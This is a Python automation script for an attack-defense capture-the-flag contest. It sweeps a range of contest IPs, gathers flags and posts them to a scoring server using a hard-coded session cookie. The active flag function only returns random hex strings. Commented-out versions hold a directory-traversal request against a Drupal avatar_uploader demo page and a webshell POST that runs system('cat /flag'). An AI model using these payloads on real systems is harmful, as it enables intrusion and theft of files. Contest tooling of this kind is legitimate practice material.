
import concurrent.futures
import datetime
import logging
import multiprocessing
import re
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MINUTE_PER_ROUND = 5 # min

SUBMIT_INTERVAL = 3 # sec
SUBMIT_TIMEOUT = 5 # sec
SUBMIT_URL = 'http://172.91.1.12:9090/ad/hacker/submit/submitCode'
#SUBMIT_TOKEN = '8263a214aab63a0206dbbd8ae018d0c1'

headers = {
      'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
      'Origin': 'http://172.91.1.12:9090',
      'Referer': 'http://172.91.1.12:9090/arace/index?'
}

COOKIES = {
      'JSESSIONID': '33217438A9E87E26137E9E3891FA61AE'
}
# flag_ptn = re.compile(r'[\da-f]{8}-[\da-f]{4}-[\da-f]{4}-[\da-f]{4}-[\da-f]{12}', re.I)
# ----------------------------------------------------
# flags 标志位参数
# re.I(re.IGNORECASE)
# 使匹配对大小写不敏感
# re.L(re.LOCAL)
# 做本地化识别（locale-aware）匹配
# re.M(re.MULTILINE)
# 多行匹配，影响 ^ 和 $
# re.S(re.DOTALL)
# 使 . 匹配包括换行在内的所有字符
# re.U(re.UNICODE)
# 根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.
# re.X(re.VERBOSE)
# 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。
# ---------------------------------------------------
# from exp import get_flag
# def get_flag(ip):
#     url = 'http://' + ip + ':5072/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../../../../../../../flag'
#     r = requests.get(url)
#     flag_mo = flag_ptn.search(r.text)
#     if flag_mo:
#         return flag_mo.group(0)
#     else:
#         return None

#get_flag 随机32位flag生成 hexdigits是字的选项
def get_flag(ip):#实现获取flag
    import random
    hexdigits = '0123456789abcdef'
    return ''.join(random.choice(hexdigits) for _ in range(32))

#送分的题目
# def get_flag(ip):#实现获取flag
#     url = "http://172.91.1."
#     shell = "/Upload/index.php"
#     passwd = "safahsfas"
#     port = "9090"
#     payload = {passwd: 'system(\'cat /flag\');'}
#     f = open("webshelllist.txt", "w")
#     f1 = open("firstrout_flag.txt", "w")
#     i=ip
#     url1 = url + str(i) + ":" + port + shell
#     try:
#         res = requests.post(url1, payload, timeout=1)
#         if res.status_code == requests.codes.ok:
#             print(url1 + "connect shell sucess,flag is " + res.text)
#             print >> f1, url1 + "connect shell sucess,flag is " + res.text
#             print >> f, url1 + "," + passwd
#         else:
#             print("shell 404")
#     except:
#         print(url1 + "connect shell fail")
#     f1.close()
#     f.close()
#     return res.text


def to_sleep_sec():
    now = datetime.datetime.now()
    next_round = (now.minute // MINUTE_PER_ROUND + 1) * MINUTE_PER_ROUND
    return (next_round - now.minute) * 60 - now.second


def timer_round(fup):
    while True:
        time.sleep(to_sleep_sec())


class FlagUploader(multiprocessing.Process):#上传flag
    def __init__(self, flag_queue, stat_queue):
        multiprocessing.Process.__init__(self)

        self.alock = multiprocessing.Lock()

        self.INTERVAL = SUBMIT_INTERVAL
        self.URL = SUBMIT_URL
     #   self.TOKEN = SUBMIT_TOKEN

        self.flags = flag_queue
        self.statuses = stat_queue
        self.submited = set()
        self.last_submit = 0

        self._stop_event = multiprocessing.Event()
        self._stop_event.clear()

    def run(self):
        while not self._stop_event.is_set():
            self.alock.acquire()
            if self.flags.empty():
                flag = None
            else:
                flag = self.flags.get()
            self.alock.release()

            if flag is None or flag in self.submited:
                continue

            #data = {'answer': flag, 'token': self.TOKEN}
            data = {'flag': flag}
            for i in range(3):
                try:
                    self.sleep_interval()
                    r = requests.post(SUBMIT_URL, data=data, headers=headers, timeout=SUBMIT_TIMEOUT, cookies=COOKIES)
                    print("thisistest")
                    print(r.content)
                    self.last_submit = time.time()
                    logging._acquireLock()
                    print(len(self.submited) + 1, 'submit', flag, r.status_code, r.content)
                    # print(r.text.strip())
                    logging._releaseLock()
                    # self.statuses.put((flag, r.json()))
                    self.alock.acquire()
                    self.submited.add(flag)
                    self.alock.release()
                    break
                except requests.Timeout:
                    logging._acquireLock()
                    print('[WARNING] try %d -- timeout' % i)
                    logging._releaseLock()
                except Exception as e:
                    logging._acquireLock()
                    print('[ERROR] ' , e)
                    logging._releaseLock()
    
    def clear_all(self):
        self.alock.acquire()
        while not self.flags.empty():
            self.flags.get()
        self.submited.clear()
        self.alock.release()

    def sleep_interval(self):
        has_pass = time.time() - self.last_submit
        if has_pass < self.INTERVAL:
            # print('now sleep {}s'.format(self.INTERVAL - has_pass))
            time.sleep(self.INTERVAL - has_pass)

    def stop(self):
        self._stop_event.set()
        self.join()


def flag_gun(ips, flag_queue, worker=8):
    with concurrent.futures.ThreadPoolExecutor(worker) as executor:
        tasks = {executor.submit(get_flag, ip): ip for ip in ips}#ip作为参数给flag
        for future in concurrent.futures.as_completed(tasks):
            flag = future.result()
            flag_queue.put(flag)
            ip = tasks[future]
            logging.info('get flag: {} - {}'.format(ip, flag))


def main():
    logging.basicConfig(level=logging.INFO)
    ips = ['172.91.0.%d' % i for i in range(0, 255)]
    flag_queue = multiprocessing.Queue()
    stat_queue = multiprocessing.Queue()
    fup = FlagUploader(flag_queue, stat_queue)
    fup.start()
    while True:
        try:
            flag_gun(ips, flag_queue)
            time.sleep(to_sleep_sec())
            fup.clear_all()
        except KeyboardInterrupt:
            fup.stop()
            results = []
            while not stat_queue.empty():
                results.append(stat_queue.get())
            now = datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')
            with open('flag_log_%s.txt' % now, 'a') as f:
                f.write(repr(results))
            logging.info('stop')
            sys.exit(0)


if __name__ == '__main__':
    main()
